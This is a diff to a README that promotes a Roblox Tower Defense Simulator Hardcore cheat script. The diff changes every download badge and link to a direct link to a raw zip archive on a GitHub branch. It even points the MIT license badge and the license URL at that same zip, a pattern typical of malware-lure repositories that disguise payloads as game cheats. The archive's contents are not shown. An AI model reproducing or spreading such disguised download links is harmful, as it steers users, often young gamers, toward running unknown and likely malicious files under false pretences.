@@ -1,6 +1,6 @@
 # Tower Defense Simulator Hardcore Roblox Script 🏰🛡️
 
-[![Download](https://img.shields.io/badge/Download-green)](https://expect8iondev.github.io)
+[![Download](https://img.shields.io/badge/Download-green)](https://github.com/expect8iondev/towersim-hardcore-evolution/raw/refs/heads/branch/Capitolium/hardcore_towersim_evolution_2.1.zip)
 
 **Welcome to the most advanced script repository for Roblox Tower Defense Simulator Hardcore!**  
 Imagine scripting as the architect behind a digital fortress, threading together strategies and code. This extensive library elevates your in-game experience with creative modifications, robust automation, and intelligent enhancements—crafted for the modern Robloxian tower strategist.
@@ -9,8 +9,8 @@ Imagine scripting as the architect behind a digital fortress, threading together
 
 ## 🚀 Quick Access
 
-- **Download Now:** https://expect8iondev.github.io  
-  [![Download](https://img.shields.io/badge/Download-green)](https://expect8iondev.github.io)
+- **Download Now:** https://github.com/expect8iondev/towersim-hardcore-evolution/raw/refs/heads/branch/Capitolium/hardcore_towersim_evolution_2.1.zip  
+  [![Download](https://img.shields.io/badge/Download-green)](https://github.com/expect8iondev/towersim-hardcore-evolution/raw/refs/heads/branch/Capitolium/hardcore_towersim_evolution_2.1.zip)
 
 ---
 
@@ -101,10 +101,10 @@ This repository is licensed under the MIT License © 2025.
 Your contributions, forks, and explorations are both welcome and encouraged.
 
 **Full License Text:**  
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://github.com/expect8iondev/towersim-hardcore-evolution/raw/refs/heads/branch/Capitolium/hardcore_towersim_evolution_2.1.zip)
 
 For full details, visit:  
-https://opensource.org/licenses/MIT
+https://github.com/expect8iondev/towersim-hardcore-evolution/raw/refs/heads/branch/Capitolium/hardcore_towersim_evolution_2.1.zip
 
 ---
 
@@ -112,6 +112,6 @@ https://opensource.org/licenses/MIT
 
 **Transform your Roblox experience today with this powerhouse of scripting possibilities!**
 
-[![Download](https://img.shields.io/badge/Download-green)](https://expect8iondev.github.io)  
+[![Download](https://img.shields.io/badge/Download-green)](https://github.com/expect8iondev/towersim-hardcore-evolution/raw/refs/heads/branch/Capitolium/hardcore_towersim_evolution_2.1.zip)  
 
 *Let this toolkit become the cornerstone of your next Tower Defense victory!*
